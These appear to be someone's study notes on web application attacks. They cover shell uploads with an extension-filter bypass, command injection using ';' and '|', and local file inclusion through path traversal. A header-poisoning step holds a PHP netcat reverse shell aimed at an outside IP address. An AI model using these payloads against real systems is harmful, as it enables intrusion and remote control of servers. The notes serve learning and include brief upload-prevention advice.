### File uploads :

- Check the website for the feature of uploading files

- Test the uploading feature with the expected file type

- Try uploading a different type of file and see the output of the process

- Upload a shell to the application . __The shell has to be inthe same langugae the website is coded in__


__Tools can be used__


- __Weavely:__ generates a php payloads 


__Advanced Fileuploads___

- Upload the allowable file to the web and intercept with the required file. [tampering the header]

- To bypass the file extension filter, add the jpg or any allowable exentensions at the end of the shell EX:" shell.php.jpg


__Prevenntion__

- Check for the type of file 

- Check foe the extension of the file 

- Analyze the contents of the file and recreate them 


### Code Execution:

- Test the website by submitting simple command as __ls__ for linux and __dir__ for windows , if it executes, it means that there is code execution vulnerability

- use semi-colod __;__ to separate the commands __EX: https:www.//site.com/index.php; ls__

- If the above command did not do anything, it could be as a result of command filtering on the applcation.

- Sometimes the semicolon does not work, piping __|__ might work work to separate the commands __EX: https:www.//site.com/index.php | ls__

### Local File Inclusion:

-  is an exploit that allows attacker to browser any file on the server

- Discovering type of vulnerability would be trhough browsing or spidering the web application, EX: www.ste.com/?page=iclude.php

  The URL shows that there a page is begining called with the paging URl == __?page=inlcude.php__

- Exploiting this vulnerability would be through going back into the root directory and look for important files 

- It is important to note that having many path traversal won't affect the validity of the url :

  For example : if the path to the root directory is 3 ../../../ path traversal , putting 5 won't effect the vaility of the path, you can still access the root directory. Therefore, always include more ../ to ensure getting to the root directory
  
  
__Advanced Technique for LFI __

- In advanced techniques for LFI, a tampering the head of the request is one of the essential thigs.

- User-agents, language and Accept can be modified through BurpSuite include the required shell commnads

__Ex: <?phpinfo();?> __ 

- __Shell Example:__ 

__<?passthru('nc -e /bin/sh 10.25.26.74 6666');?>__

- The above shell exploited the local innlusion vulnerability and use it to get access to the whole application 



